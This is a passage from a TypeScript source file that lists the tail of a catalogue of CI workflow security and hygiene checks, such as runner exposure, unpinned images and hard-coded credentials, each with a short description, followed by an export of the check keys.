  ["ci_self_hosted_runner", "Self-hosted runners are not exposed to fork pull requests"],
  ["ci_unsecure_commands", "The deprecated set-env command interface is not re-enabled"],
  ["ci_github_env_untrusted", "GITHUB_ENV is not written from attacker-controlled values"],
  ["ci_bot_condition", "Privileged steps are not gated on a spoofable actor name"],
  ["ci_hardcoded_credentials", "No workflow carries a literal username or password"],
  ["ci_plaintext_downloads", "Build steps do not fetch over plain HTTP"],
  ["ci_unpinned_images", "Container images used by jobs are digest-pinned"],
  ["ci_trusted_publishing", "Package publishing uses short-lived OIDC rather than a long-lived token"],
  ["ci_deploy_concurrency", "Deployment workflows cannot run twice at once"],
  ["ci_job_timeouts", "Jobs declare a timeout"],
  ["ci_action_typosquat", "No action is referenced from a lookalike namespace"],
  ["ci_runs_tests", "CI runs the test suite"],
  ["ci_runs_lint", "CI runs a linter"],
  ["ci_runs_typecheck", "CI type-checks the project"],
  ["ci_build_matrix", "CI tests against more than one environment"],
  ["ci_dependency_cache", "CI caches dependencies between runs"],
  ["ci_security_scanning", "CI runs a security or dependency scan"],
];

/** The catalogue, for the registry reconcile test and the coverage counter. */
export const CI_CHECK_KEYS: string[] = CI_CHECK_CATALOGUE.map(([key]) => key);
